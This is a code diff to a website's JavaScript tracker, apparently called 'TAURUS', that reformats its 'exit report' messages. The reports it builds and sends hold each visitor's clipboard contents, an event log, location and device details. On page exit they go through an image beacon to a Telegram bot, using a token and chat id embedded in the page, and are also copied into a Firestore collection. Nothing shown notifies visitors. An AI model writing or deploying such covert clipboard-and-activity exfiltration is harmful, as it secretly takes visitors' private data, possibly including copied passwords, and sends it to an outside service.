@@ -61,6 +61,23 @@
             .replace(/'/g, '&#39;');
     }
 
+    function telegramRow(icon, label, value, asCode = false) {
+        const safeValue = escapeHTML(value || 'Unknown');
+        return `${icon} <b>${label}</b>\n${asCode ? `<code>${safeValue}</code>` : safeValue}`;
+    }
+
+    function telegramPanel(title, subtitle, rows, footer = '') {
+        const separator = `━━━━━━━━━━━━━━━━━━━━`;
+        return [
+            `◼️ <b>${title}</b>`,
+            subtitle ? `<i>${subtitle}</i>` : '',
+            separator,
+            ...rows,
+            footer ? separator : '',
+            footer ? `<i>${footer}</i>` : ''
+        ].filter(Boolean).join('\n');
+    }
+
     // --- 5. TELEGRAM EXIT NOTIFICATION (Reliable GET Image Beacon) ---
     // Frontend directly sends to Telegram via GET for 100% reliability on page exit
     function fireTelegramExit(message) {
@@ -75,16 +92,17 @@
             console.warn('⚠️ URL too long (' + getUrl.length + ' chars), sending simplified version');
 
             // Extract key data from message
-            const sessionMatch = message.match(/SESSION:<\/b> <code>(.+?)<\/code>/);
-            const durationMatch = message.match(/DURATION:<\/b> <code>(.+?)<\/code>/);
-            const locationMatch = message.match(/LOCATION:<\/b> <code>(.+?)<\/code>/);
-            const deviceMatch = message.match(/DEVICE:<\/b> <code>(.+?)<\/code>/);
+            const sessionMatch = message.match(/Session<\/b>\n<code>(.+?)<\/code>/i);
+            const durationMatch = message.match(/Duration<\/b>\n<code>(.+?)<\/code>/i);
+            const locationMatch = message.match(/Location<\/b>\n(.+?)(?:\n|$)/i);
+            const deviceMatch = message.match(/Device<\/b>\n(.+?)(?:\n|$)/i);
 
-            const shortMsg = `🛑 <b>EXIT REPORT (Simplified)</b>\n` +
-                `🆔 ${sessionMatch?.[1] || 'Unknown'}\n` +
-                `⏱ ${durationMatch?.[1] || '0s'}\n` +
-                `🌍 ${locationMatch?.[1] || 'Unknown'}\n` +
-                `💻 ${deviceMatch?.[1] || 'Unknown'}`;
+            const shortMsg = telegramPanel('TAURUS // EXIT REPORT', 'Compact delivery mode', [
+                telegramRow('🆔', 'Session', sessionMatch?.[1] || 'Unknown', true),
+                telegramRow('⏱️', 'Duration', durationMatch?.[1] || '0s', true),
+                telegramRow('🌍', 'Location', locationMatch?.[1] || 'Unknown'),
+                telegramRow('💻', 'Device', deviceMatch?.[1] || 'Unknown'),
+            ]);
 
             const shortUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(shortMsg)}&parse_mode=HTML`;
             const img = new Image();
@@ -137,8 +155,6 @@
         const rawLog = localHistory.slice(-15).join('\n').substring(0, 600); // Reduced from -20 and 1200
 
         // 2. Build Comprehensive Telegram Message (SINGLE MESSAGE)
-        const separator = `━━━━━━━━━━━━━━━━━━━━━`;
-
         // Smart clipboard formatting - avoid pre tag for "None"
         const clipboardContent = escapeHTML(clipboardEntries) || '';
         const clipboardDisplay = clipboardContent ? `<pre>${clipboardContent}</pre>` : 'None';
@@ -147,19 +163,15 @@
         const logContent = escapeHTML(rawLog) || '';
         const logDisplay = logContent ? `<pre>${logContent}</pre>` : 'No events';
 
-        // ADD UNIQUE SEND ID to identify duplicates
-        const sendID = Math.random().toString(36).substr(2, 5).toUpperCase();
-
-        const tgMsg = `🛑 <b>TAURUS EXIT REPORT</b> [${sendID}]\n` +
-            `${separator}\n` +
-            `🆔 <b>SESSION:</b> <code>${sessionID}</code>\n` +
-            `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
-            `📍 <b>EXIT PAGE:</b> <code>${window.location.pathname}</code>\n` +
-            `🌍 <b>LOCATION:</b> <code>${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}</code>\n` +
-            `💻 <b>DEVICE:</b> <code>${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})</code>\n\n` +
-            `📋 <b>CLIPBOARD:</b>\n${clipboardDisplay}\n` +
-            `📝 <b>EVENT LOG:</b>\n${logDisplay}\n` +
-            `${separator}`;
+        const tgMsg = telegramPanel('TAURUS // EXIT REPORT', 'Visitor session closed', [
+            telegramRow('🆔', 'Session', sessionID, true),
+            telegramRow('⏱️', 'Duration', `${duration}s`, true),
+            telegramRow('📍', 'Exit Page', window.location.pathname, true),
+            telegramRow('🌍', 'Location', `${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}`),
+            telegramRow('💻', 'Device', `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`),
+            `📋 <b>Clipboard</b>\n${clipboardDisplay}`,
+            `📝 <b>Event Log</b>\n${logDisplay}`,
+        ]);
 
         // 3. Send to Telegram via Image Beacon (Immediate, 100% reliable)
         fireTelegramExit(tgMsg);
@@ -1265,14 +1277,15 @@
                 await window.db.collection('messages').add({
                     name: "System Report", // Sender Name
                     email: "tracker@taurus.sys", // System Email
-                    message: `SESSION REPORT [${sessionID}]\n` +
-                        `--------------------------------\n` +
-                        `⏱ DURATION: ${duration} seconds\n` +
-                        `📍 EXIT PAGE: ${window.location.pathname}\n` +
-                        `🌍 GEO: ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
-                        `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
-                        `📋 CLIPBOARD ACTIVITY:\n${clipboardEntries || 'None'}\n\n` +
-                        `📝 EVENT LOG (Last 50):\n${eventLog || 'No events recorded'}`,
+                    message: `TAURUS // SESSION REPORT\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `SESSION\n${sessionID}\n` +
+                        `DURATION\n${duration} seconds\n` +
+                        `EXIT PAGE\n${window.location.pathname}\n` +
+                        `LOCATION\n${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
+                        `DEVICE\n${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
+                        `CLIPBOARD\n${clipboardEntries || 'None'}\n\n` +
+                        `EVENT LOG\n${eventLog || 'No events recorded'}`,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                     status: 'new', // Mark as unread
                     type: 'report',
